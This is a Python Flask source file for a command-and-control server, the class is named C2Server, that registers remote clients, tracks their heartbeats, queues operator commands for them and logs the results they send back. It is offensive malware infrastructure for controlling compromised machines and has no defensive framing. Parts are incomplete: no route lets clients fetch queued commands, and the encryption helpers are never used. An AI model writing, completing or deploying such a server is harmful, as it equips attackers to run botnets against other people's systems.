import os
import json
import logging
from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import threading
import time

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Store for connected clients
connected_clients = {}
# Store for command queue
command_queue = {}

class C2Server:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        
    def encrypt_message(self, message):
        return self.cipher_suite.encrypt(json.dumps(message).encode())
    
    def decrypt_message(self, encrypted_message):
        return json.loads(self.cipher_suite.decrypt(encrypted_message).decode())

c2_server = C2Server()

@app.route('/register', methods=['POST'])
def register_client():
    """Register a new client"""
    data = request.get_json()
    client_id = data.get('client_id')
    if not client_id:
        return jsonify({'error': 'No client ID provided'}), 400
    
    connected_clients[client_id] = {
        'last_seen': time.time(),
        'status': 'active'
    }
    logger.info(f"New client registered: {client_id}")
    return jsonify({'status': 'success'})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Update client heartbeat"""
    data = request.get_json()
    client_id = data.get('client_id')
    if client_id in connected_clients:
        connected_clients[client_id]['last_seen'] = time.time()
        return jsonify({'status': 'success'})
    return jsonify({'error': 'Client not found'}), 404

@app.route('/command', methods=['POST'])
def send_command():
    """Send a command to a client"""
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    if client_id not in command_queue:
        command_queue[client_id] = []
    
    command_queue[client_id].append(command)
    return jsonify({'status': 'success'})

@app.route('/result', methods=['POST'])
def receive_result():
    """Receive command execution results from client"""
    data = request.get_json()
    client_id = data.get('client_id')
    result = data.get('result')
    
    if not client_id or not result:
        return jsonify({'error': 'Missing client_id or result'}), 400
    
    logger.info(f"Received result from {client_id}: {result}")
    return jsonify({'status': 'success'})

def cleanup_inactive_clients():
    """Remove clients that haven't sent a heartbeat in 5 minutes"""
    while True:
        current_time = time.time()
        inactive_clients = [
            client_id for client_id, data in connected_clients.items()
            if current_time - data['last_seen'] > 300
        ]
        for client_id in inactive_clients:
            del connected_clients[client_id]
            logger.info(f"Removed inactive client: {client_id}")
        time.sleep(60)

if __name__ == '__main__':
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_inactive_clients, daemon=True)
    cleanup_thread.start()
    
    # Start Flask server
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc') 